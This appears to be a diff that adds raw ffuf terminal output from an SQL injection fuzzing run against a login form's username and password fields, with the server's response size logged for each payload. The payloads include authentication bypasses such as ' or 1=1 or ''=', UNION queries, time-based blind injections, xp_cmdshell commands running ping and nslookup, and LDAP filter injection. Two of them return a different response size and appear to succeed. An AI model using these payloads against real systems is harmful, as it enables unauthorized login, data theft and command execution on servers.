+[2K    * PASS:  or 0=0 #"
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1=1 or ""=
+[2K    * PASS:  or 1=1 or ""=
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: handler
+[2K    * UNAME: handler
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: x' OR full_name LIKE '%Bob%
+[2K    * PASS: x' OR full_name LIKE '%Bob%
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: (
+[2K    * PASS: (
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: procedure
+[2K    * UNAME: procedure
+
+[32m[2K[Status: 200, Size: 607, Words: 5, Lines: 1][0m
+[2K    * UNAME: ' or 1=1 or ''='
+[2K    * PASS: ' or 1=1 or ''='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  union select * from users where login = char ...
+[2K    * PASS:  union select * from users where login = char ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or user like '%
+[2K    * PASS: ' or user like '%
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ' UNION SELECT
+[2K    * UNAME: ' UNION SELECT
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: anything' OR 'x'='x
+[2K    * PASS: anything' OR 'x'='x
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or username like '%
+[2K    * PASS: ' or username like '%
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 'text' = n'text'
+[2K    * PASS:  or 'text' = n'text'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' UNION ALL SELECT
+[2K    * PASS: ' UNION ALL SELECT
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: --sp_password
+[2K    * PASS: --sp_password
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ') or ('a'='a
+[2K    * PASS: ') or ('a'='a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or 1=1--
+[2K    * PASS: ' or 1=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ' (select top 1
+[2K    * UNAME: ' (select top 1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '; exec master..xp_cmdshell
+[2K    * PASS: '; exec master..xp_cmdshell
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '||UTL_HTTP.REQUEST
+[2K    * PASS: '||UTL_HTTP.REQUEST
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: 1;SELECT%20*
+[2K    * UNAME: 1;SELECT%20*
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: *|
+[2K    * UNAME: *|
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 0 or 1=1
+[2K    * PASS: 0 or 1=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or 3=3
+[2K    * PASS: ' or 3=3
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: <>"'%;)(&+
+[2K    * PASS: <>"'%;)(&+
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or ''='
+[2K    * PASS: ' or ''='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 3=3 --
+[2K    * PASS:  or 3=3 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or 1 --'
+[2K    * PASS: ' or 1 --'
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '; exec xp_regread
+[2K    * PASS: '; exec xp_regread
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %26
+[2K    * PASS: %26
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+[2K    * UNAME: declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or 1=1 --
+[2K    * UNAME:  or 1=1 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '%20or%201=1
+[2K    * PASS: '%20or%201=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %21
+[2K    * PASS: %21
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or 0=0 --
+[2K    * PASS: ' or 0=0 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: a' waitfor delay '0:0:10'--
+[2K    * PASS: a' waitfor delay '0:0:10'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ) union select * from information_schema.tables;
+[2K    * PASS: ) union select * from information_schema.tables;
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or '1'='1'--
+[2K    * PASS: ' or '1'='1'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '%20or%20''='
+[2K    * PASS: '%20or%20''='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: declare @s varchar(200) select @s = 0x77616974 ...
+[2K    * UNAME: declare @s varchar(200) select @s = 0x77616974 ...
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 'sqlattempt1
+[2K    * PASS: 'sqlattempt1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %28
+[2K    * PASS: %28
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '; exec master..xp_cmdshell 'ping 172.10.1.255'--
+[2K    * PASS: '; exec master..xp_cmdshell 'ping 172.10.1.255'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1 or pg_sleep(__TIME__)--
+[2K    * PASS: 1 or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: 1)) or sleep(__TIME__)#
+[2K    * UNAME: 1)) or sleep(__TIME__)#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: |
+[2K    * PASS: |
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1 or 1=1
+[2K    * PASS: 1 or 1=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or%201=1 --
+[2K    * PASS: or%201=1 --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or 1=1--
+[2K    * PASS: or 1=1--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: %2A%7C
+[2K    * PASS: %2A%7C
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: *(|(mail=*))
+[2K    * UNAME: *(|(mail=*))
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ));waitfor delay '0:0:__TIME__'--
+[2K    * PASS: ));waitfor delay '0:0:__TIME__'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: )
+[2K    * PASS: )
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ) or ('a'='a
+[2K    * UNAME: ) or ('a'='a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: t'exec master..xp_cmdshell 'nslookup www.google.com'--
+[2K    * PASS: t'exec master..xp_cmdshell 'nslookup www.google.com'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: %29
+[2K    * UNAME: %29
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ";waitfor delay '0:0:__TIME__'--
+[2K    * PASS: ";waitfor delay '0:0:__TIME__'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: tz_offset
+[2K    * UNAME: tz_offset
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: or 0=0 #
+[2K    * PASS: or 0=0 #
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: "a"" or 3=3--"
+[2K    * PASS: "a"" or 3=3--"
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or '1'='1'--
+[2K    * PASS:  or '1'='1'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1=1
+[2K    * PASS:  or 1=1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or '7659'='7659
+[2K    * UNAME:  or '7659'='7659
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 'a'='a
+[2K    * PASS:  or 'a'='a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: " or sleep(__TIME__)#
+[2K    * PASS: " or sleep(__TIME__)#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ")) or pg_sleep(__TIME__)--
+[2K    * PASS: ")) or pg_sleep(__TIME__)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: PRINT
+[2K    * PASS: PRINT
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ' or a=a--
+[2K    * UNAME: ' or a=a--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: limit
+[2K    * PASS: limit
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS:  or 2 > 1
+[2K    * UNAME:  or 2 > 1
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: x' AND userid IS NULL; --
+[2K    * UNAME: x' AND userid IS NULL; --
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or (EXISTS)
+[2K    * PASS: ' or (EXISTS)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: hi') or ('a'='a
+[2K    * PASS: hi') or ('a'='a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or username like char(37);
+[2K    * PASS:  or username like char(37);
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: (sqlvuln)
+[2K    * UNAME: (sqlvuln)
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or uname like '%
+[2K    * PASS: ' or uname like '%
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: bfilename
+[2K    * PASS: bfilename
+
+[32m[2K[Status: 200, Size: 607, Words: 5, Lines: 1][0m
+[2K    * UNAME: ' or 0=0 #
+[2K    * PASS: ' or 0=0 #
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  and 1 in (select var from temp)--
+[2K    * PASS:  and 1 in (select var from temp)--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME:  or 1=1 /*
+[2K    * PASS:  or 1=1 /*
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: '%20or%20'x'='x
+[2K    * PASS: '%20or%20'x'='x
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: " or "a"="a
+[2K    * PASS: " or "a"="a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ) or sleep(__TIME__)='
+[2K    * PASS: ) or sleep(__TIME__)='
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: ' or userid like '%
+[2K    * UNAME: ' or userid like '%
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * PASS: hi' or 'a'='a
+[2K    * UNAME: hi' or 'a'='a
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: )) or benchmark(10000000,MD5(1))#
+[2K    * PASS: )) or benchmark(10000000,MD5(1))#
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ' or uid like '%
+[2K    * PASS: ' or uid like '%
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: ;waitfor delay '0:0:__TIME__'--
+[2K    * PASS: ;waitfor delay '0:0:__TIME__'--
+
+[32m[2K[Status: 200, Size: 808, Words: 3, Lines: 6][0m
+[2K    * UNAME: 1) or pg_sleep(__TIME__)--
+[2K    * PASS: 1) or pg_sleep(__TIME__)--
+
